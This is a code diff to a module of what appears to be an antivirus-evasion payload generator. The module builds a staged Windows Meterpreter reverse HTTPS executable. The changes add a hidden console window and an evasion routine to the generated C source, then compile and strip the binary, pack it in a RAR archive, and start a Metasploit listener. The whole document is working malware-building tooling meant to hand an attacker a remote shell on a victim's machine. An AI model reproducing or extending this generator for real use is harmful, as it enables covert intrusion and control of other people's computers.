@@ -1,4 +1,4 @@
-from lib import evasion, core, gen, junkcode
+from lib import evasion, core, gen, body
 
 
 
@@ -8,10 +8,11 @@ def Construction():
     PROTOCOLE = "HTTPS"
     TYPE = "Meterpreter"
     PLATFORM = "Windows"
+    STAGED = "YES"
     
     RC_PAYLOAD = "windows/meterpreter/reverse_http"
 
-    print(core.amcolors.PURPLE + core.amcolors.BOLD + " Payload x86 Meterpreter Reverse HTTPS" + core.amcolors.ENDC)
+    print(core.amcolors.PURPLE + core.amcolors.BOLD + "[STAGED] Payload x86 Meterpreter Reverse HTTPS" + core.amcolors.ENDC)
 
     Gen_Payload = True
 
@@ -21,35 +22,31 @@ def Construction():
         LPORT = gen.LPORT_Input()
         FILENAME = "output/" + gen.FILENAME_Input() + ".exe"
 
-        print(core.amcolors.OCRA + core.amcolors.BOLD + " [*] Code generation." + core.amcolors.ENDC)
+        print(core.amcolors.OCRA + core.amcolors.BOLD + "[*] Shellcode generation." + core.amcolors.ENDC)
 
-        PAYLOAD = gen.Gen_Shellcode(ARCH, PROTOCOLE, TYPE, LHOST, LPORT)
+        PAYLOAD = gen.Gen_Shellcode(STAGED, ARCH, PROTOCOLE, TYPE, LHOST, LPORT)
 
-        Final_Code = junkcode.Start()
-
-        Final_Code += "char shellcode[] = {\n"
+        Final_Code = body.Start()
         Final_Code += str(PAYLOAD)
-
-        Final_Code += junkcode.End()
+        Final_Code += body.Hide_Window_Console()
+        Final_Code += evasion.Decoil()
+        Final_Code += body.End()
 
         with open('source.c', 'w') as f:
             f.write(Final_Code)
 
         ICON = gen.Add_Icon()
 
-        print(core.amcolors.OCRA + core.amcolors.BOLD + "\n [*] Compiling." + core.amcolors.ENDC)
+        print(core.amcolors.OCRA + core.amcolors.BOLD + "\n[*] Compiling + Stripping." + core.amcolors.ENDC)
 
         gen.Auto_Compiler(FILENAME, ARCH, PLATFORM, ICON)
-
-        print(core.amcolors.OCRA + core.amcolors.BOLD + "\n [*] Stripping executable." + core.amcolors.ENDC)
-
-        gen.Auto_Executable_Strip(FILENAME, PLATFORM)
 
         gen.Compress_Rar(FILENAME)
 
         gen.Run_Meterpreter_Script(ARCH, PLATFORM, RC_PAYLOAD, LHOST, LPORT, TYPE)
 
-        print(core.amcolors.GREEN + core.amcolors.BOLD + "\n [+] Complete task." + core.amcolors.ENDC)
-        print(core.amcolors.GREEN + core.amcolors.BOLD + " [+] Exiting script." + core.amcolors.ENDC)
+        print(core.amcolors.GREEN + core.amcolors.BOLD + "\n[+] Complete task." + core.amcolors.ENDC)
+        print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Exiting script." + core.amcolors.ENDC)
 
         Gen_Payload = False
+
